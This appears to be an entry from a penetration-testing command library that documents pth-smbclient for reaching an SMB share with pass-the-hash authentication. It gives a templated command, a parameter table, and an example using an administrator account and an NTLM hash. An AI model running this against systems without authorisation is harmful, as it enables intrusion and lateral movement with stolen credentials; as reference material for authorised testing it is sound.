---
id: ed6dc3e1-97d3-4baf-a067-8e8b95de9b44
type: command
executor: bash
data: pth-smbclient -U "$_DOMAIN/$_USERNAME%$_NTLM_HASH" //$_TARGET_IP/$_SHARE_NAME
output: null
created_at: '2023-04-06T03:56:03.238263+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - smb
  - pth
verified: true
validated: true
---

# pth-smbclient-connect-to-share

## Command

```bash
pth-smbclient -U "$_DOMAIN/$_USERNAME%$_NTLM_HASH" //$_TARGET_IP/$_SHARE_NAME
```

## Description

Connects to an SMB share using pass-the-hash authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -U | Username and NTLM hash | Yes |
| //$_TARGET_IP/$_SHARE_NAME | UNC path to share | Yes |
| $_DOMAIN | Domain (e.g., AD) | Yes |
| $_USERNAME | Username | Yes |
| $_NTLM_HASH | NTLM hash | Yes |
| $_TARGET_IP | Target IP | Yes |
| $_SHARE_NAME | Share name (e.g., Share) | Yes |

## Examples

### Basic Usage

```bash
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
```

## Expected Output

```
smb: \>
```

## Related

- [[procedures/Open-Shares-Enumeration]]
- [[tools/Impacket]]
